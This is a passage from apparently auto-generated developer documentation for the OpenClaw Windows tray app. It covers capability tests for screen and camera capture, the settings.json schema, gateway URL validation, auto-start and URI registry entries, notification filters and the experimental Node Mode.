2. **Argument parsing**: Default values, type conversion, optional parameters
3. **Event raising**: Events fire with correct argument types
4. **Error handling**: Missing handlers, invalid arguments, exceptions
5. **Response format**: Payload structure matches expected schema

### Test Coverage Examples

#### Screen Capture Validation

```csharp
[Fact]
public async Task Capture_CallsHandler_WithArgs()
{
    var cap = new ScreenCapability(NullLogger.Instance);
    ScreenCaptureArgs? receivedArgs = null;
    cap.CaptureRequested += (args) =>
    {
        receivedArgs = args;
        return Task.FromResult(new ScreenCaptureResult 
        { 
            Format = "png", Width = 1920, Height = 1080, Base64 = "abc" 
        });
    };

    var req = new NodeInvokeRequest
    {
        Id = "s2",
        Command = "screen.capture",
        Args = Parse("""{"format":"jpeg","maxWidth":800,"quality":50,"screenIndex":1}""")
    };

    var res = await cap.ExecuteAsync(req);
    Assert.True(res.Ok);
    Assert.NotNull(receivedArgs);
    Assert.Equal("jpeg", receivedArgs!.Format);
    Assert.Equal(800, receivedArgs.MaxWidth);
    Assert.Equal(50, receivedArgs.Quality);
    Assert.Equal(1, receivedArgs.MonitorIndex);
}
```

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:666-691]()

#### Camera Snap Validation

```csharp
[Fact]
public async Task Snap_CallsHandler_WithArgs()
{
    var cap = new CameraCapability(NullLogger.Instance);
    CameraSnapArgs? receivedArgs = null;
    cap.SnapRequested += (args) =>
    {
        receivedArgs = args;
        return Task.FromResult(new CameraSnapResult 
        { 
            Format = "jpeg", Width = 640, Height = 480, Base64 = "img" 
        });
    };

    var req = new NodeInvokeRequest
    {
        Id = "cam4",
        Command = "camera.snap",
        Args = Parse("""{"deviceId":"cam-1","format":"png","maxWidth":320,"quality":50}""")
    };

    var res = await cap.ExecuteAsync(req);
    Assert.True(res.Ok);
    Assert.NotNull(receivedArgs);
    Assert.Equal("cam-1", receivedArgs!.DeviceId);
    Assert.Equal("png", receivedArgs.Format);
    Assert.Equal(320, receivedArgs.MaxWidth);
    Assert.Equal(50, receivedArgs.Quality);
}
```

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:842-866]()

---

## Security Considerations

### Data URI Format

All image results are returned as `data:` URIs that embed the base64-encoded image directly in the response. This avoids the need for temporary files or HTTP endpoints and ensures the image data is transmitted securely over the WebSocket connection.

Format: `data:image/{format};base64,{base64data}`

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:742-763]()

### Synchronization Context

All hardware operations are marshaled to the UI thread using `DispatcherQueue.TryEnqueue()` to ensure thread-safe access to Windows Runtime APIs like `MediaCapture` and screen capture.

```csharp
private async Task<CameraSnapResult> OnCameraSnap(CameraSnapArgs args)
{
    if (_cameraCaptureService == null)
    {
        throw new InvalidOperationException("Camera capture service not available");
    }
    
    try
    {
        return await _cameraCaptureService.SnapAsync(args);
    }
    catch (UnauthorizedAccessException ex)
    {
        // Handle permission denial...
    }
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:444-470]()

### Resource Management

The `CameraCaptureService` uses a `SemaphoreSlim` to ensure only one camera operation executes at a time, preventing resource conflicts:

```csharp
private readonly SemaphoreSlim _captureLock = new(1, 1);

public async Task<CameraSnapResult> SnapAsync(CameraSnapArgs args)
{
    await _captureLock.WaitAsync();
    try
    {
        // Camera operations...
    }
    finally
    {
        _captureLock.Release();
    }
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:25-127]()

---

# Page: Configuration & Settings

# Configuration & Settings

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs](src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs)
- [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml](src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml)
- [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs)
- [src/OpenClaw.Tray/DEVELOPMENT.md](src/OpenClaw.Tray/DEVELOPMENT.md)
- [src/OpenClaw.Tray/Program.cs](src/OpenClaw.Tray/Program.cs)
- [src/OpenClaw.Tray/README.md](src/OpenClaw.Tray/README.md)
- [src/OpenClaw.Tray/SettingsDialog.cs](src/OpenClaw.Tray/SettingsDialog.cs)

</details>



This page documents the configuration system, settings persistence, and system integration features of the OpenClaw Windows Hub. It covers all available settings, their storage locations, the settings UI, and how settings control application behavior.

For information about the Settings UI window implementation details, see [Settings Window](#5.1). For deep link URI scheme handling, see [Deep Links & URI Schemes](#5.2). For auto-start and system integration mechanisms, see [Auto-Start & System Integration](#5.3).

## Overview

The OpenClaw Windows Hub stores user configuration in JSON format and integrates with Windows system features through the Registry and URI schemes. Settings control gateway connection, startup behavior, notification preferences, and experimental features like Node Mode.

---

## Settings Storage Architecture

The application uses multiple storage locations for different types of configuration data:

### Storage Locations

| Location | Purpose | Files |
|----------|---------|-------|
| `%APPDATA%\OpenClawTray\` | User settings (portable between machines) | `settings.json` |
| `%LOCALAPPDATA%\OpenClawTray\` | Machine-specific data | `openclaw-tray.log`, `exec-policy.json` |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Auto-start configuration | Registry value: `OpenClaw Tray` |
| `HKCR\openclaw` | URI protocol registration | Protocol handler path |

**Diagram: Settings Storage and System Integration**

```mermaid
graph TB
    subgraph "User Settings"
        SettingsManager["SettingsManager"]
        SettingsJson["settings.json<br/>%APPDATA%\OpenClawTray\"]
    end
    
    subgraph "Machine-Specific Data"
        Logger["Logger"]
        LogFile["openclaw-tray.log<br/>%LOCALAPPDATA%\OpenClawTray\"]
        ExecPolicy["exec-policy.json<br/>%LOCALAPPDATA%\OpenClawTray\"]
    end
    
    subgraph "Windows Registry"
        AutoStartReg["HKCU\...\Run<br/>OpenClaw Tray"]
        UriSchemeReg["HKCR\openclaw<br/>URL Protocol"]
    end
    
    subgraph "Settings UI"
        SettingsWindow["SettingsWindow<br/>(WinUI)"]
        SettingsDialog["SettingsDialog<br/>(WinForms)"]
        WelcomeDialog["WelcomeDialog<br/>(First-run)"]
    end
    
    subgraph "System Integration"
        AutoStartManager["AutoStartManager"]
        DeepLinkHandler["DeepLinkHandler"]
    end
    
    SettingsWindow --> SettingsManager
    SettingsDialog --> SettingsManager
    WelcomeDialog --> SettingsWindow
    
    SettingsManager --> SettingsJson
    Logger --> LogFile
    
    SettingsManager --> AutoStartManager
    AutoStartManager --> AutoStartReg
    
    DeepLinkHandler --> UriSchemeReg
    
    SettingsManager -.->|"EnableNodeMode"| ExecPolicy
```

Sources: [src/OpenClaw.Tray/README.md:173-193](), [src/OpenClaw.Tray/DEVELOPMENT.md:94-107]()

---

## Settings Schema

### SettingsManager Data Model

The `SettingsManager` class manages all application settings with the following properties:

**Diagram: Settings Categories and Dependencies**

```mermaid
graph LR
    subgraph "Connection Settings"
        GatewayUrl["GatewayUrl<br/>string"]
        Token["Token<br/>string"]
    end
    
    subgraph "Startup Settings"
        AutoStart["AutoStart<br/>bool"]
        GlobalHotkeyEnabled["GlobalHotkeyEnabled<br/>bool"]
    end
    
    subgraph "Notification Settings"
        ShowNotifications["ShowNotifications<br/>bool"]
        NotificationSound["NotificationSound<br/>string"]
        
        subgraph "Notification Filters"
            NotifyHealth["NotifyHealth<br/>bool"]
            NotifyUrgent["NotifyUrgent<br/>bool"]
            NotifyReminder["NotifyReminder<br/>bool"]
            NotifyEmail["NotifyEmail<br/>bool"]
            NotifyCalendar["NotifyCalendar<br/>bool"]
            NotifyBuild["NotifyBuild<br/>bool"]
            NotifyStock["NotifyStock<br/>bool"]
            NotifyInfo["NotifyInfo<br/>bool"]
        end
    end
    
    subgraph "Advanced Settings"
        EnableNodeMode["EnableNodeMode<br/>bool<br/>(EXPERIMENTAL)"]
    end
    
    ShowNotifications -.->|"Master toggle"| NotifyHealth
    ShowNotifications -.->|"Master toggle"| NotifyUrgent
    ShowNotifications -.->|"Master toggle"| NotifyReminder
    ShowNotifications -.->|"Master toggle"| NotifyEmail
    ShowNotifications -.->|"Master toggle"| NotifyCalendar
    ShowNotifications -.->|"Master toggle"| NotifyBuild
    ShowNotifications -.->|"Master toggle"| NotifyStock
    ShowNotifications -.->|"Master toggle"| NotifyInfo
    
    AutoStart -.->|"Controls"| Registry["Windows Registry<br/>Auto-start entry"]
```

### settings.json Format

```json
{
  "GatewayUrl": "ws://localhost:18789",
  "Token": "your-api-token",
  "AutoStart": false,
  "GlobalHotkeyEnabled": true,
  "ShowNotifications": true,
  "NotificationSound": "Default",
  "NotifyHealth": true,
  "NotifyUrgent": true,
  "NotifyReminder": true,
  "NotifyEmail": true,
  "NotifyCalendar": true,
  "NotifyBuild": true,
  "NotifyStock": true,
  "NotifyInfo": true,
  "EnableNodeMode": false
}
```

Sources: [src/OpenClaw.Tray/README.md:173-193]()

---

## Connection Settings

### Gateway URL

The `GatewayUrl` setting specifies the WebSocket endpoint for the OpenClaw Gateway. It supports both local and remote connections.

**Valid URL Formats:**

| Format | Example | Use Case |
|--------|---------|----------|
| Local WebSocket | `ws://localhost:18789` | WSL2 or local gateway |
| Remote WebSocket | `ws://192.168.1.100:18789` | Gateway on local network |
| Secure WebSocket | `wss://host.tailnet.ts.net` | Tailscale or remote SSL |
| HTTPS (auto-upgrade) | `https://host.tailnet.ts.net` | Converted to `wss://` |

**URL Validation:**

The `GatewayUrlHelper` class validates URLs before use:

```mermaid
graph TD
    Input["User Input URL"]
    Normalize["GatewayUrlHelper.NormalizeGatewayUrl()"]
    Validate["GatewayUrlHelper.IsValidGatewayUrl()"]
    Extract["GatewayUrlHelper.ExtractCredentials()"]
    
    Input --> Normalize
    Normalize -->|"http:// → ws://"| Validate
    Normalize -->|"https:// → wss://"| Validate
    Validate -->|"Valid"| Extract
    Validate -->|"Invalid"| Error["ValidationMessage property"]
    Extract -->|"Returns url, token"| Use["Use in OpenClawGatewayClient"]
```

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:98-153](), [src/OpenClaw.Tray/SettingsDialog.cs:277-305]()

### Authentication Token

The `Token` setting stores the gateway authentication token. In the WinForms UI, the token field uses `UseSystemPasswordChar = true` to mask the token during input.

**Token Extraction from URL:**

URLs can embed credentials: `ws://token@localhost:18789` is parsed into separate `url` and `token` components by `GatewayUrlHelper.ExtractCredentials()`.

Sources: [src/OpenClaw.Tray/SettingsDialog.cs:78-82]()

### Connection Testing

Both UIs provide a "Test" button that validates connectivity:

**Connection Test Flow:**

```mermaid
sequenceDiagram
    participant User
    participant SettingsWindow
    participant TestClient as "OpenClawGatewayClient<br/>(temporary)"
    participant Gateway as "OpenClaw Gateway"
    
    User->>SettingsWindow: Click "Test" button
    SettingsWindow->>SettingsWindow: Disable button<br/>Set status "Testing..."
    SettingsWindow->>TestClient: new OpenClawGatewayClient(url, token)
    SettingsWindow->>TestClient: ConnectAsync()
    
    TestClient->>Gateway: WebSocket handshake
    
    alt Connection Successful
        Gateway-->>TestClient: Connected (status event)
        TestClient-->>SettingsWindow: StatusChanged(Connected)
        SettingsWindow->>User: Display "✅ Connected!"
        SettingsWindow->>TestClient: Dispose()
    else Connection Failed
        TestClient-->>SettingsWindow: StatusChanged(Error) or timeout
        SettingsWindow->>User: Display "❌ Connection failed"
        SettingsWindow->>TestClient: Dispose()
    end
    
    SettingsWindow->>SettingsWindow: Re-enable button
```

The test uses a 5-second timeout and a temporary logger to avoid polluting the main log file.

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:98-153](), [src/OpenClaw.Tray/SettingsDialog.cs:277-305]()

---

## Startup Settings

### Auto-Start with Windows

The `AutoStart` setting controls whether the application launches automatically when Windows starts.

**Implementation:**

When `AutoStart` is enabled, the application manipulates the Windows Registry:

```
Key: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Value Name: OpenClaw Tray
Value Data: "C:\path\to\OpenClaw.Tray.WinUI.exe"
```

**Auto-Start Management Flow:**

```mermaid
graph TD
    SettingsSaved["Settings Saved"]
    CheckAutoStart{"AutoStart == true?"}
    AutoStartManager["AutoStartManager.SetAutoStart()"]
    
    subgraph "Registry Operations"
        CreateKey["Create/Open Registry Key<br/>HKCU\...\Run"]
        SetValue["SetValue('OpenClaw Tray', exePath)"]
        DeleteValue["DeleteValue('OpenClaw Tray')"]
    end
    
    SettingsSaved --> CheckAutoStart
    CheckAutoStart -->|"Yes"| AutoStartManager
    CheckAutoStart -->|"No"| AutoStartManager
    
    AutoStartManager --> CreateKey
    CreateKey -->|"enabled = true"| SetValue
    CreateKey -->|"enabled = false"| DeleteValue
```

The `AutoStartManager` class handles platform-specific registry operations:

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:94-96](), [src/OpenClaw.Tray/SettingsDialog.cs:259-275]()

### Global Hotkey

The `GlobalHotkeyEnabled` setting controls registration of the system-wide `Ctrl+Alt+Shift+C` hotkey, which opens the Quick Send dialog from anywhere.

**Global Hotkey Architecture:**

```mermaid
graph LR
    SettingsManager["SettingsManager<br/>GlobalHotkeyEnabled"]
    TrayApplication["TrayApplication"]
    GlobalHotkey["GlobalHotkey<br/>(Win32 RegisterHotKey)"]
    WindowProc["WndProc<br/>(Message handler)"]
    QuickSendDialog["QuickSendDialog"]
    
    SettingsManager -->|"Setting changed"| TrayApplication
    TrayApplication -->|"Register/Unregister"| GlobalHotkey
    GlobalHotkey -->|"WM_HOTKEY message"| WindowProc
    WindowProc -->|"Open"| QuickSendDialog
```

If another application has already registered the same hotkey combination, registration fails silently and is logged.

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:49](), [src/OpenClaw.Tray/SettingsDialog.cs:99-101]()

---

## Notification Settings

### Master Toggle

The `ShowNotifications` setting acts as a master on/off switch for all desktop notifications. When disabled, no toast notifications are shown regardless of filter settings.

### Notification Sound

The `NotificationSound` setting controls the audio played with toast notifications:

| Value | Behavior |
|-------|----------|
| `"Default"` | System default notification sound |
| `"None"` | Silent notifications |
| `"Subtle"` | Quiet notification sound |
| `"Critical"` | (WinForms only) Urgent sound |
| `"Information"` | (WinForms only) Info sound |

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:59-63](), [src/OpenClaw.Tray/SettingsDialog.cs:122-132]()

### Notification Filters

The application provides 8 granular notification filters that categorize messages by content:

**Notification Filter Categories:**

| Setting Property | UI Label | Keywords/Criteria |
|-----------------|----------|-------------------|
| `NotifyHealth` | 🩸 Health alerts | glucose, blood sugar, CGM |
| `NotifyUrgent` | 🚨 Urgent messages | urgent, error, critical, alert |
| `NotifyReminder` | ⏰ Reminders | reminder, remind, due |
| `NotifyEmail` | 📧 Email summaries | email, mail, inbox |
| `NotifyCalendar` | 📅 Calendar events | calendar, meeting, event |
| `NotifyBuild` | 🔨 Build notifications | build, CI, test, deploy |
| `NotifyStock` | 📦 Stock alerts | stock, available, in stock |
| `NotifyInfo` | 🤖 Info messages | info, general (fallback) |

**Notification Filtering Logic:**

```mermaid
graph TD
    IncomingNotification["Incoming Notification<br/>(chat event)"]
    MasterToggle{"ShowNotifications<br/>== true?"}
    ClassifyType["Classify notification type<br/>(keyword matching)"]
    
    subgraph "Filter Checks"
        CheckHealth{"Type == Health<br/>&& NotifyHealth?"}
        CheckUrgent{"Type == Urgent<br/>&& NotifyUrgent?"}
        CheckReminder{"Type == Reminder<br/>&& NotifyReminder?"}
        CheckEmail{"Type == Email<br/>&& NotifyEmail?"}
        CheckCalendar{"Type == Calendar<br/>&& NotifyCalendar?"}
        CheckBuild{"Type == Build<br/>&& NotifyBuild?"}
        CheckStock{"Type == Stock<br/>&& NotifyStock?"}
        CheckInfo{"Type == Info<br/>&& NotifyInfo?"}
    end
    
    ShowToast["Show Toast Notification"]
    AddToHistory["Add to Notification History<br/>(Always)"]
    Skip["Skip Toast<br/>(Filtered)"]
    
    IncomingNotification --> MasterToggle
    MasterToggle -->|"No"| AddToHistory
    MasterToggle -->|"Yes"| ClassifyType
    
    ClassifyType --> CheckHealth
    ClassifyType --> CheckUrgent
    ClassifyType --> CheckReminder
    ClassifyType --> CheckEmail
    ClassifyType --> CheckCalendar
    ClassifyType --> CheckBuild
    ClassifyType --> CheckStock
    ClassifyType --> CheckInfo
    
    CheckHealth -->|"Yes"| ShowToast
    CheckUrgent -->|"Yes"| ShowToast
    CheckReminder -->|"Yes"| ShowToast
    CheckEmail -->|"Yes"| ShowToast
    CheckCalendar -->|"Yes"| ShowToast
    CheckBuild -->|"Yes"| ShowToast
    CheckStock -->|"Yes"| ShowToast
    CheckInfo -->|"Yes"| ShowToast
    
    CheckHealth -->|"No"| Skip
    CheckUrgent -->|"No"| Skip
    CheckReminder -->|"No"| Skip
    CheckEmail -->|"No"| Skip
    CheckCalendar -->|"No"| Skip
    CheckBuild -->|"No"| Skip
    CheckStock -->|"No"| Skip
    CheckInfo -->|"No"| Skip
    
    Skip --> AddToHistory
```

**Important:** Even when a notification is filtered out (not shown as a toast), it is still added to the Notification History for later review.

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:65-80](), [src/OpenClaw.Tray/SettingsDialog.cs:154-168](), [src/OpenClaw.Tray/README.md:33-44]()

### Test Notification Button

Both settings UIs include a "Test Notification" button that demonstrates the current notification configuration:

```csharp
// WinUI implementation
new ToastContentBuilder()
    .AddText("Test Notification")
    .AddText("This is a test notification from OpenClaw Tray.")
    .Show();
```

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:155-168](), [src/OpenClaw.Tray/SettingsDialog.cs:212-225]()

---

## Advanced Settings

### Node Mode (Experimental)

The `EnableNodeMode` setting enables experimental remote control capabilities. When enabled, the Windows PC becomes a controllable node that can execute commands sent from the gateway.

**Node Mode Security:**

Node Mode has multiple security layers:

1. **Gateway Allowlist**: The gateway must explicitly allow commands in `~/.openclaw/openclaw.json`
2. **Local Execution Policy**: Local `exec-policy.json` controls which commands can run
3. **URL Validation**: Canvas navigation blocks `file://`, `localhost`, and private IPs

**Node Mode Configuration Storage:**

```
%LOCALAPPDATA%\OpenClawTray\exec-policy.json
```

The execution policy file is managed separately from user settings to prevent accidental synchronization across machines.

**Node Mode Toggle Effect:**

```mermaid
graph TD
    ToggleNodeMode["User toggles EnableNodeMode"]
    SaveSettings["SettingsManager.Save()"]
    
    subgraph "Application Restart Required"
        CheckOnStartup["TrayApplication startup"]
        ReadSetting{"EnableNodeMode<br/>== true?"}
        InitNodeClient["Initialize WindowsNodeClient"]
        ConnectGateway["Connect to gateway<br/>with node capabilities"]
        RegisterCapabilities["Register capabilities:<br/>- SystemCapability<br/>- CanvasCapability<br/>- ScreenCapability<br/>- CameraCapability"]
    end
    
    ToggleNodeMode --> SaveSettings
    SaveSettings -.->|"Requires app restart"| CheckOnStartup
    CheckOnStartup --> ReadSetting
    ReadSetting -->|"Yes"| InitNodeClient
    ReadSetting -->|"No"| SkipNode["Skip node initialization"]
    InitNodeClient --> ConnectGateway
    ConnectGateway --> RegisterCapabilities
```

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:88-98](), [src/OpenClaw.Tray/README.md:166-170]()

---

## Settings UI Implementation

### WinUI Settings Window

The modern WinUI application uses `SettingsWindow.xaml` with the following structure:

**SettingsWindow Layout:**

```mermaid
graph TB
    Window["SettingsWindow<br/>(WindowEx)"]
    
    subgraph "Visual Styling"
        MicaBackdrop["MicaBackdrop<br/>(Windows 11 effect)"]
        MinSize["MinWidth: 400<br/>MinHeight: 500"]
    end
    
    subgraph "Content Area (Scrollable)"
        ConnectionSection["CONNECTION Section<br/>- GatewayUrlTextBox<br/>- TokenTextBox<br/>- TestConnectionButton<br/>- StatusLabel"]
        
        StartupSection["STARTUP Section<br/>- AutoStartToggle<br/>- GlobalHotkeyToggle"]
        
        NotificationsSection["NOTIFICATIONS Section<br/>- NotificationsToggle<br/>- NotificationSoundComboBox<br/>- TestNotificationButton<br/>- 8 filter checkboxes"]
        
        AdvancedSection["ADVANCED Section<br/>- NodeModeToggle<br/>- Warning text"]
    end
    
    subgraph "Fixed Footer"
        ButtonPanel["Button Panel<br/>- Cancel<br/>- Save (AccentButtonStyle)"]
    end
    
    Window --> MicaBackdrop
    Window --> MinSize
    Window --> ConnectionSection
    Window --> StartupSection
    Window --> NotificationsSection
    Window --> AdvancedSection
    Window --> ButtonPanel
```

**Key UI Features:**

- **Scrollable content area** with fixed footer ([src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:21-101]())
- **Mica backdrop** for modern Windows 11 appearance ([src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:10-12]())
- **Section headers** with red accent color and bold font ([src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:26-27]())
- **Real-time validation** with status labels ([src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:39-40]())

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:1-117]()

### WinForms Settings Dialog

The legacy WinForms application uses `SettingsDialog` with a custom `ModernForm` base class:

**SettingsDialog Features:**

- Dark theme with custom colors
- Manual layout positioning
- Same logical structure as WinUI version
- Two-column filter checkbox layout

Sources: [src/OpenClaw.Tray/SettingsDialog.cs:9-335]()

### Settings Load and Save Flow

**Settings Persistence Flow:**

```mermaid
sequenceDiagram
    participant User
    participant UI as "SettingsWindow"
    participant Manager as "SettingsManager"
    participant File as "settings.json"
    participant Registry as "Windows Registry"
    
    Note over User,Registry: Load Settings
    User->>UI: Open Settings window
    UI->>Manager: Read properties
    Manager->>File: Load from disk
    File-->>Manager: JSON data
    Manager-->>UI: Populate controls
    UI-->>User: Show current settings
    
    Note over User,Registry: Save Settings
    User->>UI: Modify settings
    User->>UI: Click "Save"
    UI->>UI: Validate GatewayUrl
    UI->>Manager: Set properties
    Manager->>Manager: Validate values
    Manager->>File: Write JSON
    Manager->>Manager: Trigger SettingsSaved event
    UI->>Manager: AutoStartManager.SetAutoStart()
    Manager->>Registry: Update Run key
    UI->>User: Close window
```

**Validation Before Save:**

The save operation validates the gateway URL using `GatewayUrlHelper.IsValidGatewayUrl()`:

```csharp
if (!GatewayUrlHelper.IsValidGatewayUrl(gatewayUrl))
{
    StatusLabel.Text = $"❌ {GatewayUrlHelper.ValidationMessage}";
    return;
}
```

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:34-67](), [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:69-96](), [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:170-182]()

---

## First-Run Experience

### Welcome Dialog

New users are greeted with a `WelcomeDialog` that explains the application and guides them to settings:

**WelcomeDialog Flow:**

```mermaid
graph TD
    FirstLaunch["Application First Launch"]
    CheckSettings{"settings.json<br/>exists?"}
    ShowWelcome["Show WelcomeDialog"]
    
    subgraph "Welcome Dialog Content"
        LobsterHeader["🦞 Welcome to OpenClaw!"]
        Description["Explanation of app purpose"]
        Requirements["Requirements list:<br/>- Running gateway<br/>- API token"]
        DocsLink["📚 View Documentation link"]
        Buttons["'Later' or 'Open Settings'"]
    end
    
    UserChoice{"User clicks?"}
    OpenSettings["Open SettingsWindow"]
    CloseWelcome["Close welcome dialog"]
    
    FirstLaunch --> CheckSettings
    CheckSettings -->|"No"| ShowWelcome
    CheckSettings -->|"Yes"| SkipWelcome["Skip welcome"]
    
    ShowWelcome --> LobsterHeader
    LobsterHeader --> Description
    Description --> Requirements
    Requirements --> DocsLink
    DocsLink --> Buttons
    
    Buttons --> UserChoice
    UserChoice -->|"'Open Settings'"| OpenSettings
    UserChoice -->|"'Later'"| CloseWelcome
    
    OpenSettings --> SettingsWindow["SettingsWindow"]
```

**WelcomeDialog Implementation:**

The dialog uses WinUI with:
- Mica backdrop for modern appearance
- Center screen positioning (480x440)
- Direct window content (not ContentDialog)
- TaskCompletionSource for async result handling

Sources: [src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs:1-133]()

---

## System Integration Details

### Registry Structure

**Auto-Start Registry Entry:**

```
Key: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Value Name: OpenClaw Tray
Value Type: REG_SZ
Value Data: "C:\Users\Username\AppData\Local\Programs\OpenClaw.Tray.WinUI\OpenClaw.Tray.WinUI.exe"
```

**URI Scheme Registration:**

```
Key: HKEY_CLASSES_ROOT\openclaw
  (Default) = "URL:OpenClaw Protocol"
  URL Protocol = ""
  
Key: HKEY_CLASSES_ROOT\openclaw\shell\open\command
  (Default) = "\"C:\...\OpenClaw.Tray.WinUI.exe\" \"%1\""
```

The `DeepLinkHandler.RegisterUriScheme()` method creates these registry entries on first run.

Sources: [src/OpenClaw.Tray/Program.cs:42-43]()

### File Locations Summary

**Complete File System Layout:**

```
%APPDATA%\OpenClawTray\
  └─ settings.json                    # User settings (portable)

%LOCALAPPDATA%\OpenClawTray\
  ├─ openclaw-tray.log                # Application log (1MB rotation)
  └─ exec-policy.json                 # Node mode execution policy

Registry:
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    └─ OpenClaw Tray                  # Auto-start entry
  
  HKCR\openclaw                        # URI protocol handler
    └─ shell\open\command
```

---

## Settings and Application Behavior

### Connection Settings Impact

| Setting | Application Behavior |
|---------|---------------------|
| `GatewayUrl` | Used by `OpenClawGatewayClient` constructor for WebSocket connection |
| `Token` | Sent as `Authorization: Bearer {token}` in WebSocket headers |

### Startup Settings Impact

| Setting | Application Behavior |
|---------|---------------------|
| `AutoStart` | Registry entry controls Windows startup; does not affect running instance |
| `GlobalHotkeyEnabled` | Registers/unregisters Win32 hotkey; takes effect immediately |

### Notification Settings Impact

| Setting | Application Behavior |
|---------|---------------------|
| `ShowNotifications` | Master switch; when `false`, all toasts are suppressed |
| `NotificationSound` | Passed to `ToastContentBuilder` audio settings |
| `Notify*` filters | Each controls whether specific notification types trigger toasts |

### Advanced Settings Impact

| Setting | Application Behavior |
|---------|---------------------|
| `EnableNodeMode` | Requires application restart; initializes `WindowsNodeClient` on startup |

---

## Settings Validation and Error Handling

### Gateway URL Validation

The `GatewayUrlHelper` class provides validation before settings are saved:

**Validation Rules:**

1. Must start with `ws://`, `wss://`, `http://`, or `https://`
2. `http://` and `https://` are auto-converted to WebSocket equivalents
3. Must have valid host component
4. Port is optional (defaults to 18789)

**Validation Error Messages:**

- Empty URL: "Gateway URL cannot be empty"
- Invalid scheme: "URL must start with ws://, wss://, http://, or https://"
- Malformed URL: "Invalid URL format"

### Token Validation

No format validation is performed on tokens; empty tokens are allowed but will cause authentication failures at connection time.

### Save Failures

Settings save operations are wrapped in try-catch blocks. File write failures (e.g., disk full, permissions) are logged but do not prevent the UI from closing.

---

## Configuration for Different Deployment Scenarios

### Local Gateway (WSL2)

**Typical Configuration:**
```json
{
  "GatewayUrl": "ws://localhost:18789",
  "Token": "abc123..."
}
```

### Remote Gateway (Tailscale)

**Typical Configuration:**
```json
{
  "GatewayUrl": "wss://gateway.tailnet.ts.net",
  "Token": "xyz789..."
}
```

### Multiple Machines

Settings in `%APPDATA%` can be synchronized across machines using:
- OneDrive folder redirection
- Cloud backup solutions
- Manual file copy

**Note:** Machine-specific settings (`%LOCALAPPDATA%`) should NOT be synchronized, as they contain:
- Logs specific to the machine
- Execution policies with machine-specific paths

---

## Programmatic Settings Access

Other components access settings through the `SettingsManager` singleton:

```csharp
// Reading settings
var gatewayUrl = _settings.GatewayUrl;
var shouldNotify = _settings.ShowNotifications && _settings.NotifyHealth;

// Saving settings
_settings.GatewayUrl = "ws://localhost:18789";
_settings.Save();

// Listening for changes
_settings.SettingsSaved += OnSettingsSaved;
```

The `SettingsSaved` event is raised after successful save operations, allowing components to react to configuration changes.

Sources: [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:17](), [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:180]()

---

# Page: Settings Window

# Settings Window

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml](src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml)
- [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs)
- [src/OpenClaw.Tray/Program.cs](src/OpenClaw.Tray/Program.cs)
- [src/OpenClaw.Tray/SettingsDialog.cs](src/OpenClaw.Tray/SettingsDialog.cs)

</details>



The Settings Window provides a graphical user interface for configuring all aspects of the OpenClaw Tray application, including gateway connection parameters, startup behavior, notification preferences, and experimental features. It exists in two implementations: a modern WinUI version (`SettingsWindow`) and a legacy WinForms version (`SettingsDialog`), both sharing the same underlying configuration model.

For information about how settings are persisted and managed, see [Settings Management](#5.2). For details on system integration features configured through this window, see [Auto-Start & System Integration](#5.3).

---

## Architecture Overview

The Settings Window follows a Model-View pattern where both UI implementations interact with a shared `SettingsManager` instance that handles persistence and validation.

**Settings Window Architecture**

```mermaid
graph TB
    subgraph "User Interface Layer"
        WinUIWindow["SettingsWindow.xaml<br/>(WinUI)"]
        WinFormsDialog["SettingsDialog.cs<br/>(WinForms)"]
    end
    
    subgraph "Code-Behind"
        WinUICode["SettingsWindow.xaml.cs"]
        WinFormsCode["SettingsDialog"]
    end
    
    subgraph "Shared Configuration"
        SettingsMgr["SettingsManager<br/>JSON persistence"]
        GatewayUrlHelper["GatewayUrlHelper<br/>URL validation"]
    end
    
    subgraph "System Integration"
        AutoStartMgr["AutoStartManager<br/>Registry manipulation"]
        Registry["Windows Registry<br/>HKCU\Run"]
    end
    
